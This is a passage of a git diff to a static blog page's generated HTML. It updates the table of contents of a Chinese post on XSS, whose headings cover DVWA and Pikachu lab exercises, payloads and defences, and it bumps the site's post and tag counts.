class="nav-text">impossible：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-number">2.3.</span> <span class="nav-text">dom型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A-1"><span class="nav-number">2.3.4.</span> <span class="nav-text">impossible：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pikachu"><span class="nav-number">3.</span> <span class="nav-text">pikachu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="nav-number">3.1.</span> <span class="nav-text">反射型xss(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="nav-number">3.2.</span> <span class="nav-text">反射型xss(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">3.3.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-1"><span class="nav-number">3.4.</span> <span class="nav-text">dom型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-x"><span class="nav-number">3.5.</span> <span class="nav-text">dom型xss-x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">3.6.</span> <span class="nav-text">xss之盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.7.</span> <span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">3.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">3.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">3.10.</span> <span class="nav-text">xss之js输出</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#js%E5%AD%A6%E4%B9%A0"><span class="nav-number">4.</span> <span class="nav-text">js学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM%E5%AD%A6%E4%B9%A0"><span class="nav-number">5.</span> <span class="nav-text">DOM学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-DOM-%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">5.0.1.</span> <span class="nav-text">1. DOM 的本质</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-DOM-%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">5.0.2.</span> <span class="nav-text">2. DOM 节点类型</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">xss介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">xss存在的原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.0.2.</span> <span class="nav-text">xss的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%88Persistent-XSS%EF%BC%89"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">存储型XSS（Persistent XSS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Reflected-Cross-Site-Scripting%EF%BC%89"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">反射型XSS（Reflected Cross-Site Scripting）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%88Document-Object-Model-based-XSS%EF%BC%89"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">DOM型XSS（Document Object Model-based XSS）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E7%A7%8Dxss%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">三种xss区别：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="nav-number">1.0.4.</span> <span class="nav-text">XSS的攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="nav-number">1.0.5.</span> <span class="nav-text">XSS漏洞的挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.6.</span> <span class="nav-text">XSS的简单绕过滤和绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa"><span class="nav-number">2.</span> <span class="nav-text">dvwa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflected%E5%9E%8Bxss"><span class="nav-number">2.1.</span> <span class="nav-text">Reflected型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A"><span class="nav-number">2.1.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A"><span class="nav-number">2.1.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A"><span class="nav-number">2.1.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible-%EF%BC%9A"><span class="nav-number">2.1.4.</span> <span class="nav-text">impossible ：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Store%E5%9E%8BXSS"><span class="nav-number">2.2.</span> <span class="nav-text">Store型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A"><span class="nav-number">2.2.3.</span> <span class="nav-text">impossible：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-number">2.3.</span> <span class="nav-text">dom型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A-1"><span class="nav-number">2.3.4.</span> <span class="nav-text">impossible：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pikachu"><span class="nav-number">3.</span> <span class="nav-text">pikachu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="nav-number">3.1.</span> <span class="nav-text">反射型xss(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="nav-number">3.2.</span> <span class="nav-text">反射型xss(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">3.3.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-1"><span class="nav-number">3.4.</span> <span class="nav-text">dom型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-x"><span class="nav-number">3.5.</span> <span class="nav-text">dom型xss-x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">3.6.</span> <span class="nav-text">xss之盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.7.</span> <span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">3.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">3.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">3.10.</span> <span class="nav-text">xss之js输出</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">4.</span> <span class="nav-text">xss的防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%B8%B8%E7%94%A8Payload"><span class="nav-number">5.</span> <span class="nav-text">xss常用Payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#js%E5%AD%A6%E4%B9%A0"><span class="nav-number">6.</span> <span class="nav-text">js学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM%E5%AD%A6%E4%B9%A0"><span class="nav-number">7.</span> <span class="nav-text">DOM学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-DOM-%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">7.0.1.</span> <span class="nav-text">1. DOM 的本质</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-DOM-%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">7.0.2.</span> <span class="nav-text">2. DOM 节点类型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">8.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="nav-number">9.</span> <span class="nav-text">跨域请求</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">9.1.</span> <span class="nav-text">解决跨域问题的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CORS-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB"><span class="nav-number">9.1.0.1.</span> <span class="nav-text">CORS (跨域资源共享)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSONP-%E4%BB%85%E9%99%90GET%E8%AF%B7%E6%B1%82"><span class="nav-number">9.1.0.2.</span> <span class="nav-text">JSONP (仅限GET请求)</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -656,7 +853,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -668,7 +865,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
